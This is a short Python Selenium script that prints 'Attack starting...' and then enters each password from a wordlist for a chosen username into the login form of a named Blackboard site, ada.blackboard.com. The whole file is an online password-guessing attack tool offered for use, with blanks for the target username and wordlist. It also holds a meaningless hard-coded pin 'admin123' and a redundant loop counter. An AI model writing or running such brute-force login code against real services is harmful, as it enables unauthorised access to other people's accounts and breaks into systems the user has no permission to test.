from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Chrome('/usr/local/bin/chromedriver')

print('Attack starting...')

website = "https://ada.blackboard.com" # your website (attack to) 
username = "" # your username here
password = [''] # your wordlist here

driver.get(website) 

i = 0 

for i in range(len(password)):
    time.sleep(1)
    if(driver.title == 'ADA Login'): 
        driver.find_element_by_id('username').send_keys(username)
        driver.find_element_by_id('password').send_keys(password[i])
        driver.find_element_by_tag_name('button').click()
        print(password[i])
    else: 
        lock = str(input('Locked. Write pin : ' )) 
        if(lock == 'admin123'):
            print("try") # make program to loop 
        else: 
            print("BLOCKED!!!")

    i += 1
